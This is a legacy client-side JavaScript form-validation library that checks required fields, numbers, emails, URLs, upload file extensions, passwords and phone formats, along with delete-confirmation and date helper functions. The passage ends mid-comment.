//Version -- modified by Akash
// theMessages are not converted in lower cases now.
//

//<form name='frm' method='post' action=''

//onSubmit='return theValidator(this,"Input1,Input3,temp,ta,rad","Name,Zip Code,Template,Comments,University/Non-University",",Y,,,",",,,,",",,,,");'>





//The parameters

// 0) The instance of the form , use 'this' rather than name

// 1) The name of the controls separated by comma, only add name of controls which you want to be validated.

// 2) The Message i.e if you write Name, then the msg would be 'Name cannot be blank.'

// 3) If you want any control to be validated for numeric value, then specify 'Y'

//    exactly in the same order if the 1st parameter has values Input1,Input2,temp,.. if you want to validate the Input2

//    control for numeric value the ,Y,,....

// 4) Email parameter - order as point 3

// 5) URL parameter - order as point 3

// TODO:

//	Email Validation - Done

//	URL Validation	- Done

 //implementation

/*

function check(theform)

{

	thecontrols="vchAttorneyName,vchFirmName,vchAddress1,vchAddress2,vchStateName,vchCity,vchZipCode,vchPhone,vchFax,vchEmailAddress,intFormatID";

	themessages="Attorney name,Firm name,Address,Address,State,City,Zipcode,Phone,Fax,Email address,Format";

	theNumeric=",,,,,,,,,,";

	theEmail=",,,,,,,,,Y,";

	theURL=","

	theConfirmPassword=",";

	thebadstuff="1,1,,,,,,,,,";

	theinteger=",,,,,,,,,,";

	thepercent=",";

	thesize=",,,,,,,,,,";

	thedecimal=",,,,,,,,,,";

	theimage=",";

	theempty="Y,Y,Y,,Y,Y,Y,Y,,Y,Y";

	themin=",";

	themax=",";

	thecheckboxlength=",,,,,,,,,,";

	thephoneno=",,,,,,,Y,Y,,";



	if(!theValidator(theForm,theControl,theMessage,theNumeric,theEMail,theURL,theConfirmPassword,thebadstuff,theinteger,thepercent,thesize,thedecimal,theimage,theempty,themin,themax,thecheckboxlength,thephoneno))

		return false;



	return true;

}

*/



//	*************************************  theValidator **********************************************************



function theValidator(theForm,theControl,theMessage,theNumeric,theEMail,theURL,theConfirmPassword,thebadstuff,theinteger,thepercent,thesize,thedecimal,theimage,theempty,themin,themax,thecheckboxlength,thephoneno)

{

	// This function is used to validate that all text

	// fields in a given form contain some value

	//Split the controls + Messages + Numerics by comma ,





	var theMessages = new Array();

	var theNumerics = new Array();

	var theEMails = new Array();

	var theURLs = new Array();

	var theConfirmPasswords = new Array();



	theControls=theControl.split(",");

	theMessages=theMessage.split(",");

	theNumerics=theNumeric.split(",");

	theEMails=theEMail.split(",");

	theURLs=theURL.split(",");

	thebadstuffs=thebadstuff.split(",");

	theintegers=theinteger.split(",");

	thepercents=thepercent.split(",");

	thesizes=thesize.split(",");

	thedecimals=thedecimal.split(",");

	theimages=theimage.split(",");

	theemptys=theempty.split(",");

	themins=themin.split(",");

	themaxs=themax.split(",");

	thecheckboxlengths=thecheckboxlength.split(",");

	theConfirmPasswords=theConfirmPassword.split(",");

	thephonenos=thephoneno.split(",");

	//alert(thecheckboxlength);

	//alert(theForm.elements.length);



//	alert(theControl);

	for (var i=0; i < theForm.elements.length; i++){

//		alert("Type: " + theForm.elements[i].type);



		for(var counter=0;counter < theControls.length; counter++)
		{
			if (theForm.elements[i].name == theControls[counter])
			{
				if (theForm.elements[i].type == 'file')
				{
					//Blank value check
					if (trim(theForm.elements[i].value) == '' && theemptys[counter] == "Y" )
					{
//						alert(theMessages[counter] + " cannot be blank.");
						//alert("Please enter the "+theMessages[counter]+".");
						// Changed by Akash -- 3 august 2006
						alert("Please enter the "+theMessages[counter]+".");
						theForm.elements[i].focus();
						return false;
					}
					else
					{
						if (theimages[counter] == "YG")
						{
							var s=theForm.elements[i].value;
							if (s!="")
							{
								array=s.split("\\");
								len=array.length;
								filename=array[len-1];
								array1=filename.split(".");
								if (array1.length == 1)
								{
									alert("Files with extensions .jpg, .jpeg, .jpe can only be uploaded.");
									theForm.elements[i].focus();
									return false;
								}

//if(array1[1].toLowerCase()!="jpg" && array1[1].toLowerCase()!="jpeg" && array1[1].toLowerCase()!="gif" && array1[1].toLowerCase()!="png")

if(array1[1].toLowerCase()!="jpg" && array1[1].toLowerCase()!="jpeg" && array1[1].toLowerCase()!="jpe" && array1[1].toLowerCase()!="jpg" && array1[1].toLowerCase()!="jpg")

								{
									alert("Files with extensions .jpg, .jpeg, .jpe can only be uploaded.");
									theForm.elements[i].focus();
									return false;
								}
							}
						}

if (theimages[counter] == "Y")
{
	var s=theForm.elements[i].value;

	if (s!="")
	{
		array=s.split("\\");
		len=array.length;
		filename=array[len-1];
		array1=filename.split(".");
		len1=array1.length;
		f_ext = array1[len1-1].toLowerCase();

		if (f_ext.length == 1)
		{
			alert("Files with extensions .jpg, .jpeg, .jpe, .gif can only be uploaded.");
			theForm.elements[i].focus();
			return false;
		}

		if(f_ext!="jpg" && f_ext!="jpeg" && f_ext!="jpe" && f_ext!="jpg" && f_ext!="jpg" && f_ext!="gif")
		{
			alert("Files with extensions .jpg, .jpeg, .jpe, .gif can only be uploaded.");
			theForm.elements[i].focus();
			return false;
		}
	}
}

						if (theimages[counter] == "C")

						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .txt can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if(array1[len1].toLowerCase()!="txt")

								{

									alert("Files with extensions .txt can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}
						if (theimages[counter] == "PDF")

						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .pdf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if(array1[len1].toLowerCase()!="pdf")

								{

									alert("Files with extensions .pdf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}
						if (theimages[counter] == "PDFDOT")

						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .pdf,.dot,.doc,.dwg can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if((array1[len1].toLowerCase()!="pdf") &&  (array1[len1].toLowerCase()!="dot") &&   (array1[len1].toLowerCase()!="doc") &&   (array1[len1].toLowerCase()!="dwg"))

								{

									alert("Files with extensions .pdf,.dot,.doc,.dwg can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}
						if (theimages[counter] == "SWF")
						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .swf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if(array1[len1].toLowerCase()!="swf")

								{

									alert("Files with extensions .swf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}
						if (theimages[counter] == "SWFWMV")
						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .swf,.wmv,.avi,.flv can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if((array1[len1].toLowerCase()!="swf") &&  (array1[len1].toLowerCase()!="wmv") &&  (array1[len1].toLowerCase()!="avi") &&  (array1[len1].toLowerCase()!="flv"))

								{

									alert("Files with extensions .swf,.wmv,.avi,.flv can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}
						if (theimages[counter] == "YC")

						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .gif, .jpg, .jpeg, .txt, .doc, .pdf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if(array1[len1].toLowerCase()!="jpg" && array1[len1].toLowerCase()!="jpeg" && array1[len1].toLowerCase()!="gif" && array1[len1].toLowerCase()!="txt" && array1[len1].toLowerCase()!="doc" && array1[len1].toLowerCase()!="pdf")

								{

									alert("Files with extensions .gif, .jpg, .jpeg, .txt, .doc, .pdf can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}



						if (theimages[counter] == "YCX")

						{

							var s=theForm.elements[i].value;

							if (s!="")

							{

								array=s.split("\\");

								len=array.length;

								filename=array[len-1];

								array1=filename.split(".");

								len1 = array1.length;

								len1 = len1-1;

								if (array1.length == 1)

								{

									alert("Files with extensions .doc can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

								if( array1[len1].toLowerCase()!="doc" )

								{

									alert("Files with extensions .doc can only be uploaded.");

									theForm.elements[i].focus();

									return false;

								}

							}

						}



					}



				}



				if (theForm.elements[i].type == 'text'||theForm.elements[i].name == 'creditCardVerCode')

				{

					//Blank value check

					if (trim(theForm.elements[i].value) == '' && theemptys[counter] == "Y")

					{

//						alert(theMessages[counter] + " cannot be blank.");

						alert("Please enter the "+theMessages[counter]+".");

						theForm.elements[i].focus();

						return false;

					}



					// integer value >=0

				/*	if (theEMails[counter] != "Y" && theURLs[counter] != "Y" && theNumerics[counter] != "Y")

					{

						chkstring = trim(theForm.elements[i].value);

						badStuff = "~`!@#$%^&*()=+|<>?;:/\"\\";

						for (x=0; x<badStuff.length; x++)

						{

							badCheck = badStuff.charAt(x);

							if (chkstring.indexOf(badCheck,0) != -1)

							{



								alert(theMessages[counter]+" can not have special characters.");

								theForm.elements[i].focus();

								return false;

							}

						}

					}*/





					// Numeric value check

					if (trim(theForm.elements[i].value) != '' && theNumerics[counter] == "Y")

					{

						if(isNaN(trim(theForm.elements[i].value)))

						{

//							alert(theMessages[counter] + " should be numeric.");

							alert("Please enter numeric values for "+theMessages[counter]+".");

							theForm.elements[i].focus();

							return false;

						}

						if(trim(theForm.elements[i].value)<= 0 )

						{

//							alert(theMessages[counter] + " should be greater than 0.");

							alert("Please enter "+theMessages[counter]+" greater than  0 (zero).");

							theForm.elements[i].focus();

							return false;

						}

					}



					if  (trim(theForm.elements[i].value) != '' && theintegers[counter] == "Y")

					{

							if(isNaN(trim(theForm.elements[i].value)))

								{

		//							alert(theMessages[counter] + " should be numeric.");

									alert("Please enter numeric values for "+theMessages[counter]+".");

									theForm.elements[i].focus();

									return false;

								}

							if(parseInt(trim(theForm.elements[i].value),10)< 0 )

								{

								alert("Please enter "+theMessages[counter] +" greater than or equal to 0 (zero).");

								theForm.elements[i].focus();

								return false;

								}

					}





					// for bad stuff in password type

                     if ((trim(theForm.elements[i].value) != '' ) && (thebadstuffs[counter] != ""))

					{

						if (thebadstuffs[counter]==1)// for company name & '",.:()-_@#$

								//badStuff = "`~!%^*()=+|<>?;/\\\[]{}";
								badStuff = "`~!%^*=|<>?;/\\\[]{}";

							else if(thebadstuffs[counter]==2)

							badStuff="~`!@$%^&* #()=+|<>?;.':/\"\\-_[]{},";//for not a single bad stuff

							else if(thebadstuffs[counter]==3)//fake url only - _ . allow

								badStuff="~`!@$%^&* ()=+|<>?;.':/\"\\[]{},";

							else if(thebadstuffs[counter]==14)

								badStuff=".~`#!@$%^&*()=+|<>;':? ,/\"\\-_[]{}";

							else if(thebadstuffs[counter]==4)

								badStuff="~`#!@$%^&*=+|<>/\\[]{}";		// Allowed ? space and comma -- Sumit

							else if(thebadstuffs[counter]==5)//productname

								badStuff=".`-~#!@$%^&*()=+|<>?;:/\"\\[]{},";

							else if(thebadstuffs[counter]==6)//User Name only under score

								badStuff=".`-'~_#!@$%^&*()=+|<>?;:/\"\\[]{},";

							else if(thebadstuffs[counter]==7)//First/Last Name only ' come

								badStuff="`-~#!@$%^&*_()=+|<>?;:/\"\\[]{},1234567890";

							else if(thebadstuffs[counter]==8)//for zip code

					badStuff="`'~#!@$%^&* _()=+|<>?;:/\"\\[]{},ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

                            else if(thebadstuffs[counter]==9)

								badStuff="~`!@$%^&*#()=|<>?;.':/\"\\_[]{},";//only - and  space for a city - alphanumericsy

							else

								badStuff='"';



							chkstring = trim(theForm.elements[i].value);

							for (x=0; x<badStuff.length; x++)

							{

								badCheck = badStuff.charAt(x);

								if (chkstring.indexOf(badCheck,0) != -1)

								{

									if(badStuff=='"')
										alert("Please replace double quotes with single quotes for "+theMessages[counter]+".");

									else if(thebadstuffs[counter]==7)
										alert(theMessages[counter]+" can not have special characters or numbers.");

									else if(thebadstuffs[counter]==8)
										alert(theMessages[counter]+" can not have special characters or alphabets.");

									else if(thebadstuffs[counter]==9)
										alert(theMessages[counter]+" can only contain alphanumerics.");

									else
										alert(theMessages[counter]+" can not have special characters.");



									theForm.elements[i].focus();

									return false;

								}

							}

					}



					if (trim(theForm.elements[i].value) != '' && thepercents[counter] == 'Y')

					{

								if (parseInt(theForm.elements[i].value,10)<0 || parseInt(theForm.elements[i].value,10)>100)

								{



									alert(theMessages[counter]+" should have value between 0 to 100.");

									theForm.elements[i].focus();

									return false;

								}

					}





					if (trim(theForm.elements[i].value) != '' && thesizes[counter] != "")

					{

								if (trim(theForm.elements[i].value).length>thesizes[counter])

								{



//									alert(theMessages[counter]+" cannot have more than "+thesizes[counter]+" characters.");

									alert("Maximum characters allowed are "+ thesizes[counter] +". Entered are "+ theForm.elements[i].value.length +" characters.");

									theForm.elements[i].focus();

									return false;

								}

					}



					if (trim(theForm.elements[i].value) != '' && thedecimals[counter] == "Y")

					{

								var str=theForm.elements[i].value;

									 if (str.indexOf('.')!=-1)

										{

										   alert("No decimals allowed for "+theMessages[counter]+".");

										    theForm.elements[i].focus();

											return false;

										}

					}



					if (trim(theForm.elements[i].value) != '' && thephonenos[counter] == "Y")

					{

						//var regexp=/^\d{3}-\d{3}-\d{4}$/;
						var regexp=/^\d{3} \d{4}$/;

						x = trim(theForm.elements[i].value);

						if(!(regexp.test(x)))

						{

							var msg = "";

							msg = "Please enter "+theMessages[counter];

							msg = msg + " as: xxx xxxx";

							alert(msg);

						    theForm.elements[i].focus();

							return false;

						}

					}



					// Email value check

					if (trim(theForm.elements[i].value) != '' && theEMails[counter] == "Y")

					{

						if(!emailcheck(theForm.elements[i],"Please enter valid email address."))  return false;

						//{

						//	alert("Invalid Email Address\n Should be user@domain.com");

						//	theForm.elements[i].focus();

							//return false;

						//}

					}

					// URL value check

					if (trim(theForm.elements[i].value) != '' && theURLs[counter] == "Y")

					{

						if(!validateURL(trim(theForm.elements[i].value)))

						{

//							alert(" Invalid URL \n Should be http://www.domain.com");

							alert("Please enter valid url. \n e.g. http://www.domain.com");

							theForm.elements[i].focus();

							return false;

						}

					}



					if (trim(theForm.elements[i].value) !='' && themins[counter]!='' && themaxs[counter]!='')

					{

						if(parseInt(theForm.elements[i].value,10)<themins[counter] || parseInt(theForm.elements[i].value,10)>themaxs[counter])

						{

							alert("Please enter value for "+theMessages[counter]+" between "+themins[counter]+" and "+themaxs[counter]+".");

							theForm.elements[i].focus();

							return false;

						}

					}

					if (trim(theForm.elements[i].value) !='' && themins[counter]!='' && themaxs[counter]=='')

					{

						if((theForm.elements[i].value.length)<themins[counter])

						{

							alert("Please enter valid "+theMessages[counter]+".");

							theForm.elements[i].focus();

							return false;

						}

					}

					if (trim(theForm.elements[i].value) !='' && themaxs[counter]!='')

					{

						if( parseInt(theForm.elements[i].value,10)>themaxs[counter])

						{

							alert("Please enter value for "+theMessages[counter]+" not more than "+themaxs[counter]+".");

							theForm.elements[i].focus();

							return false;

						}

					}



				}

				// Password Validation

				if (theForm.elements[i].type == 'password' && theConfirmPasswords[counter]!="Y" && theForm.elements[i].name!="creditCardVerCode")

				{

					//Blank value check

					if (trim(theForm.elements[i].value) == '')

					{

//						alert(theMessages[counter] + " cannot be blank.");

						alert("Please enter the "+theMessages[counter]+".");

						theForm.elements[i].focus();

						return false;

					}





						if(theForm.elements[i].value.length > 14)

					{

						alert("Password cannot have more than 14 characters.");

						theForm.elements[i].focus();

						return false;

					}





						if(theForm.elements[i].value.length < 6)

					{

						alert("Password cannot be less than 6 characters.");

						theForm.elements[i].focus();

						return false;

					}





				}



				// Confirm Password Validation

				//alert(theForm.elements[i].type);

				//alert(theConfirmPassword[counter]);

				if (theForm.elements[i].type=='password' && theConfirmPasswords[counter]=="Y")

				{

					//alert("mandeep");

					//alert(theForm.elements[i].value);

					//alert(theForm.elements[i-1].value);



					//Blank value check

					if (trim(theForm.elements[i].value) == '')

					{

//						alert(theMessages[counter] + " cannot be blank.");

						alert("Please retype the "+theMessages[counter]+".");

						theForm.elements[i].focus();

						return false;

					}





						if(theForm.elements[i].value.length > 14)

					{

						alert("Password cannot have more than 14 characters.");

						theForm.elements[i].focus();

						return false;

					}





						if(theForm.elements[i].value.length < 6)

					{

						alert("Password cannot be less than 6 characters.");

						theForm.elements[i].focus();

						return false;

					}



					if (theForm.elements[i].value!=theForm.elements[i-1].value)

					{

//						alert(theMessages[counter] + " is not same.");

						alert("Passwords do not match.");

						theForm.elements[i].focus();

						return false;

					}



				}





			//Select box validation

				if (theForm.elements[i].type == "select-one")

				{

					var selIndex,selValue;

					selIndex=theForm.elements[i].selectedIndex;

					var theObject=theForm.elements[i];

					selValue = theObject[selIndex].value;

					if( (trim(selValue) == "" || trim(selValue) == "0") && theemptys[counter] == "Y")

					{

						alert("Please select the " + theMessages[counter] + ".");

						theForm.elements[i].focus();

						return false;

					}

				}

				if(theForm.elements[i].type == "select-multiple")
				{

					var flagselected="0";
					var e1=theForm.elements[i];
					for(var j=1;j<theForm.elements[i].options.length ;j++)
					{
						if(theForm.elements[i].options[j].selected)
						{
							if(theForm.elements[i].options[j].value!="")
							flagselected="1";
							//break;
						}
					}
					if(flagselected=="0")
					{
						alert("Please select the " + theMessages[counter] + ".");
						theForm.elements[i].focus();
						return false;
					}
				}
			//Check box validation

				//alert(theForm.elements[i].type);

				//alert(theemptys[counter]);

				if ((theForm.elements[i].type == "checkbox" ||  theForm.elements[i].type == "radio") && theemptys[counter] == "Y" )

				{

					var flagchecked="0";



//					theControls[counter]=theControls[counter].substr(0,theControls[counter].length-2);

//					checkboxname=eval("theForm."+theControls[counter]);

					if (parseInt(thecheckboxlengths[counter],10) > 1)

					{

//						for (j=0;j<parseInt(thecheckboxlengths[counter]);j++)

						for (j=i;j<i+parseInt(thecheckboxlengths[counter],10);j++)



						{

//							checkbox1=eval(checkboxname[j]);

//							if(checkbox1.checked==true)

							checkbox1=eval(theForm.elements[j]);

							if(checkbox1.checked==true)

							{

								flagchecked="1";

								break;

							}

						}

					}

					else

					{

						if(theForm.checkboxname.checked==true)

						{

							flagchecked="1";

						}

					}

					if (flagchecked=="0")

					{

						alert("Please select the " + theMessages[counter] + ".");

						theForm.elements[i].focus();

						return false;

					}

					i=i+parseInt(thecheckboxlengths[counter],10)-1;

				}



			// Text Area Validation

				if (theForm.elements[i].type == "textarea")

				{

					var txtAreaValue;

					txtAreaValue=theForm.elements[i].value;

					if( trim(txtAreaValue) == "" && theemptys[counter] == "Y")

					{

//						alert(theMessages[counter] + " cannot be blank.");

						alert("Please enter the "+theMessages[counter]+".");

						theForm.elements[i].focus();

						return false;

					}

					if (trim(theForm.elements[i].value) != '' && thesizes[counter] != "")

					{

								if (trim(theForm.elements[i].value).length>thesizes[counter])

								{

										//Maximum characters allowed are n. Entered are m characters.

									//alert(theMessages[counter]+" cannot have more than "+thesizes[counter]+" characters.");



									alert("Maximum characters allowed are "+ thesizes[counter] +". Entered are "+ theForm.elements[i].value.length +" characters.");

									theForm.elements[i].focus();

									return false;

								}

					}

				}







			// Radio Button Validation

			// This radio button validation is buggy so I am commneting it out

			/*	if(theForm.elements[i].type == "radio")

				{

//alert(theForm.elements[i].value);

					if(getRadioButtonValue(theForm.elements[i],theForm.elements[i].name) == "-1")

					{

						alert("You must select " + theMessages[counter] + ".");

						return false;

					}

				}*/

			}



		}

	}



	return true;

}







//	************************************	End theValidator *****************************************************





function getRadioButtonValue(theForm,theControl)

{

	var i;

	alert("Hello " + theForm + " control.length: " + theControl.length);

	for( i=0; i< theControl.length; ++i)

	{

alert(theForm[i].checked);

		if( theControl[i].checked)

		{



			return theControl[i].value;

		}

	}



	// default (non selected)

	return -1;

}



function ltrim ( s )

{

	return s.replace( /^\s*/, "" )

}



function rtrim ( s )

{

	return s.replace( /\s*$/, "" );

}



function trim(str)

{

//	return rtrim(ltrim(str));

	return( (""+str).replace(/^\s*([\s\S]*\S+)\s*$|^\s*$/,'$1') );

}





function emailcheck(object,str)

{

var email=object.value;

var matcharray=email.match(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/)

	if(matcharray==null){

	alert(str)

	 	object.focus();

		object.select();

	return false;

	}

	else return true

}



function validateEmail(email)

{



	// This function is used to validate a given e-mail

	// address for the proper syntax



	if (email == ""){

		return false;

	}

	badStuff = ";:/,' \"\\";

	for (i=0; i<badStuff.length; i++){

		badCheck = badStuff.charAt(i)

		if (email.indexOf(badCheck,0) != -1){

			return false;

		}

	}

	posOfAtSign = email.indexOf("@",1)

	if (posOfAtSign == -1){

		return false;

	}

	if (email.indexOf("@",posOfAtSign+1) != -1){

		return false;

	}

	posOfPeriod = email.indexOf(".", posOfAtSign)

	if (posOfPeriod == -1){

		return false;

	}

	if (posOfPeriod+2 > email.length){

		return false;

	}

	return true

}





function validateURL1(myobject)

{

	var re;

	var checkend=/\w\.[a-zA-Z]{2,3}$/;

	url=myobject.value;



	if(url.search(checkend) == -1)

	{

		alert("Please enter valid url. \n e.g. http://www.domain.com");

		return false;

	}

	return true;

}

function validateURL(myobject)

{

	var re;

	var checkend=/\w\.[a-zA-Z]{2,3}/;

	url=myobject;



	if(url.search(checkend) == -1)

	{

		return false;

	}

	return true;

}



function MM_openBrWindow(theURL,winName,features) { //v2.0

  window.open(theURL,winName,features);

}

function confirmdelete(theform,startElement,endElement)

{

	var flag=0;

	for(i=startElement;i<theform.length-endElement;i=i+1)		  //confirmation message for delete

	{



		if(theform.elements[i].checked==true)

		{

			 flag=1;

			 if (confirm("Are you sure you want to delete this record(s)?"))

				return true;

			else

				return false;

		}

	}



	if(flag==0)

	{

		alert("Please select the checkbox before pressing the delete button.");

		return false;

	}

}

function confirmation(theform,startElement,endElement,confirmaction)

{

	var flag=0;



	for(i=startElement;i<theform.length-endElement;i=i+1)		  //confirmation message for delete

	{

		alert(theform.elements[i].checked);



		if(theform.elements[i].checked==true)

		{

			 flag=1;

			 if (confirm("Are you sure you want "+confirmaction+" this record?"))

				return true;

			else

				return false;

		}

	}



	if(flag==0)

	{



		alert("Please select the checkbox before pressing the "+confirmaction+" button.");

		return false;





	}





}



function confirmationsetdafault(theform,startElement,endElement,confirmaction)

{

	var flag=0;

	for(i=startElement;i<theform.length-endElement;i=i+1)		  //confirmation message for delete

	{

		if(theform.elements[i].checked==true)

		{

			 flag=1;

			 if (confirm("Are you sure you want to set as deafult this Category(s)?"))

				return true;

			else

				return false;

		}

	}

	if(flag==0)

	{

		alert("Please select the checkbox before pressing the "+confirmaction+" button.");

		return false;

	}

}



function confirmationactive(theform,startElement,endElement,confirmaction)

{

	var flag=0;

	for(i=startElement;i<theform.length-endElement;i=i+1)		  //confirmation message for delete

	{

		if(theform.elements[i].checked==true)

		{

			 flag=1;

			 if (confirm("Are you sure you want to activate this Member(s)?"))

				return true;

			else

				return false;

		}

	}

	if(flag==0)

	{

		alert("Please select the checkbox before pressing the "+confirmaction+" button.");

		return false;

	}

}



function confirmCatDelete(theform,msg)	//orderdetail.php

{

	if (confirm("Are you sure you want to delete this "+msg+"?"))

	{	formName=eval("document."+theform);

		formName.flag.value=1;

		formName.submit();

	}

}

function checkQuantity(theform)			//shopingcart.php

{

	var flag=0;

	for(i=0;i<theform.length;i=i+2)		  //confirmation message for delete

	{

		if(theform.elements[i].checked==true)

		{

			 flag=1;

			 if (confirm("Are you sure you want delete this record?"))

				return true;

			else

				return false;

		}

	}

	if(flag==0)

	{

		for(i=1;i<theform.length;i=i+2)  //numeric value for quantity if user wants to update quantity

		{

			if(isNaN(theform.elements[i].value))

			{

				alert("Quantity should be numeric.");

				theform.elements[i].focus();

				return false;

			}

			if(theform.elements[i].value < 0)

			{

				alert("Quantity should be greater than 0.");

				theform.elements[i].focus();

				return false;

			}

		}

		return true;

	}

}





  function checkdate(theform)     //,dd1,mm1,yy1,dd2,mm2,yy2)

 {



   day1=theform.dd1.options[theform.dd1.selectedIndex].value;

   mon1=theform.mm1.options[theform.mm1.selectedIndex].value;

   year1=theform.yy1.options[theform.yy1.selectedIndex].value;

   day2=theform.dd2.options[theform.dd2.selectedIndex].value;

   mon2=theform.mm2.options[theform.mm2.selectedIndex].value;

   year2=theform.yy2.options[theform.yy2.selectedIndex].value;



	var fromdate = new Date(year1,mon1,day1);

	var todate=new Date(year2,mon2,day2);



	if(fromdate >todate)

	 {

		alert("From date should be less than to date.");

		theform.dd2.focus();

		return false;

	 }

	 return true;

 }



function validate (field, maxlen, str)

{

	if (field.value.length > maxlen)

	{

//		alert ("Field length exceeded.\nAllowed: "+maxlen+" characters,\nEntered: "+field.value.length+" characters.");

		alert(str+" cannot have more than "+maxlen+" characters.");

		field.focus();

		return  false;

	}

	return true;

}



function validate_min_len (field, minlen, str)

{

	if (field.value.length < minlen)

	{



		alert(str+" cannot be less than "+minlen+" characters.");

		field.focus();

		return  false;

	}

	return true;

}



function fileextension(object,str)

{

	var s=object.value;

	if (s!="")

	{

		array=s.split("\\");

		len=array.length;

		filename=array[len-1];

		array1=filename.split(".");

		if(array1[1]!="jpg" && array1[1]!="jpeg" && array1[1]!="gif")

		{

			alert(str);

			object.focus();

			return false;

		}

	}



	return true;

}

function emailcheck(object,str)

{

var email=object.value;

var matcharray=email.match(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/)

	if(matcharray==null){

	alert(str)

	 	object.focus();

		object.select();

	return false;

	}

	else return true

}



function yearcheck(number)

{

	if (number < 1000)

	{

		 number = number + 1900;

	}



 return number;

}



function changedate(theform,i)

{

	if (i==0)

	{

	theformdd=eval(theform.dd1);

	theformmm=eval(theform.mm1);

	theformyy=eval(theform.yy1);

	}

	else

	{

	theformdd=eval(theform.dd2);

	theformmm=eval(theform.mm2);

	theformyy=eval(theform.yy2);

	}



	day1=theformdd.options[theformdd.selectedIndex].value;

//	alert(theform.elements[i].options[theform.elements[i].selectedIndex].value);

	month1=theformmm.options[theformmm.selectedIndex].value;

	month1=month1-1;

	year1=theformyy.options[theformyy.selectedIndex].value;

	var test = new Date(year1,month1,day1);



	aday=test.getDate();

	if ( (parseInt(yearcheck(test.getYear()),10) == parseInt(year1,10)) && (parseInt(month1,10) == parseInt(test.getMonth(),10)) && (parseInt(day1,10) == parseInt(test.getDate(),10)) )

	{

		newdate=new Date(year1,month1,aday);

		dayNew=eval("theformdd.options[theformdd.selectedIndex]");

		dayNew.value=newdate.getDate();

		optionNumber=newdate.getDate();

		aku=eval("theformdd.options[optionNumber-1]");

		aku.selected=true;

		monthNew=eval("theformmm.options[theformmm.selectedIndex]");

		if (newdate.getMonth()==0 && newdate.getDate()==1 && newdate.getFullYear()>year1 )

			{

			monthNew.value=1;

			opmonth=1;

			}

		else

			{

			monthNew.value=newdate.getMonth()+1;

			opmonth=newdate.getMonth()+1;

			}

		amu=eval("theformmm.options[opmonth-1]");

		amu.selected=true;



		yearNew=eval("theformyy.options[theformyy.selectedIndex]");

		yearNew.value=newdate.getFullYear();

		opyear=newdate.getFullYear();

		abc=eval("theformyy");

		for( var u=0;u<abc.options.length;u++)

		{

			if(yearNew.value==abc.options[u].text)

			{

				ayu=eval("theformyy.options[u]");

				ayu.selected=true;

			}

		}

	}

	else

	{

		alert("Please enter valid date.");

		theformdd.focus();

		return false;

	}

		return true;

}



/*

* This function will not return until (at least)

* the specified number of milliseconds have passed.

* It does a busy-wait loop.

*/

function pause(numberMillis)

{

	var now = new Date();

	var exitTime = now.getTime() + numberMillis;

	while (true)

	{

		now = new Date();

		if (now.getTime() > exitTime)

			return;

	}

}



/*  To ask for confirmation before deleting a FAQ */





function textCounter(field,maxlimit)

{

	if (field.value.length > maxlimit)

		field.value = field.value.substring(0, maxlimit);

}



function delfaq()

{

	if(!confirm("Are you sure you want to delete this FAQ?"))

		return false;



		return true;

}



function delTestimonial()

{

	if(!confirm("Are you sure you want to delete this testimonial?"))

		return false;



		return true;

}



function del(str)

{

	if(!confirm("Are you sure you want to delete this "+str+"?"))

		return false;



		return true;

}



function add_group(src,dst)

{

	var selectone=src;

	var selecttwo=dst;



	var i=0;

	while(i<selectone.length)

	{



	if(selectone.options[i].selected==true)

	{



		var selecttwolength=selecttwo.length;

		selecttwo.options[selecttwolength]=new Option(selectone.options[i].text);

		selecttwo.options[selecttwolength].value=selectone.options[i].value;

		selectone.options[i]=null;

		i=i-1;

	}

	i=i+1;

	}

}



function remove_group(src,dst)

{

	var selectone=src;

	var selecttwo=dst;



	k=(selecttwo.length-1);

	var i=k;

	while(i>=0)

	{



	if(selecttwo.options[i].selected==true)

	{

	var selectonelength=selectone.length;

	var selectoneOption=new Option(selecttwo.options[i].text);

	selectone.options[selectonelength]=selectoneOption;

	selecttwo.options[i]=null;

	k=k-1;

	}

	i=i-1;



	}



}

 /*'--- ---------------------------------------------------------

'Name   : CheckFromToDate

'Developer  : Ekansh

